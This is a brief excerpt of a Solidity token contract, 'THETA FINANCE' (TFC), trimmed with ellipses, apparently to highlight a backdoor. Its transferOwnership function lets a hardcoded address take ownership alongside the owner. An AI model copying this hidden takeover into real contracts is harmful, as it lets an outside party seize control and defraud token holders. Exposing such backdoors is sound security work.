...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xF85A60E85b51036d362B2A22E1E0918ef79Ba608));
...
contract THETAFINANCE is Context, IERC20, Ownable, Pausable {
  ...
  uint256 private _totalSupply = 5000000 * 10**9;
  string private _symbol = "TFC";
  string private _name = "THETA FINANCE";
